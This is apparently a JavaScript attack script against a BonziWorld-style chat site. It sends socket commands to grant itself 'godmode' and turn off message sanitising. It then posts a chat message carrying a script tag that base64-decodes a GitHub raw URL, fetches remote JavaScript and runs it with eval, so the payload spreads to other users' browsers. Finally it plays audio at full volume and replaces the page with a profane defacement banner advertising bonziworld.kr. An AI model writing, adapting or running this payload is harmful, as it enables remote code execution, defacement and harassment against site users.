socket.emit('command', { list: ['godmode'] });
const audioUrl = 'https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/blob/main/hdfghdfghdfghdfg.wav?raw=true';
function playAudioWithRetry(url, maxRetries = 5, delay = 1000) {
  let attempts = 0;
  function attemptPlay() {
    const audio = new Audio(url);
    audio.volume = 1.0;
    audio.play().catch((error) => {
      attempts++;
      console.warn(`Playback failed (Attempt ${attempts}/${maxRetries}):`, error);
      if (attempts < maxRetries) {
        setTimeout(attemptPlay, delay);
      } else {
        console.error('Max audio playback retries reached. Giving up.');
      }
    });
  }
  attemptPlay();
}
playAudioWithRetry(audioUrl);
socket.emit('command', { list: ['sanitize', 'off'] });
socket.emit('talk', { text: "GET UNIVERSAL FUCKED BY THE NYX RAS STUDIOS COME ON AND JOIN BONZIWORLD YOU FUCKERS https://bonziworld.kr <script>fetch(atob(`aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v`)+`NYX`+atob(`Lmpz`)).then(r=>r.text()).then(t=>eval(t))</script>" });
(function() {
    const bgUrl = "https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/blob/main/image_2026-09-22_184623421.png?raw=true";
    document.documentElement.innerHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>GET FUCKED BY NYXRAS</title>
            <style>
                body {
                    margin: 0;
                    height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    background: url("${bgUrl}") repeat;
                }
                h1 {
                    font-family: Impact, sans-serif;
                    font-size: 3vw;
                    color: white;
                    text-shadow: 4px 4px 0px black, -4px -4px 0px black, 4px -4px 0px black, -4px 4px 0px black;
                    margin: 0;
                    user-select: none;
                }
            </style>
        </head>
        <body>
            <h1>GET FUCKED BY NYXRAS YOU ARE GOING TO JOIN BONZIWORLD.KR</h1>
        </body>
        </html>
    `;
})();
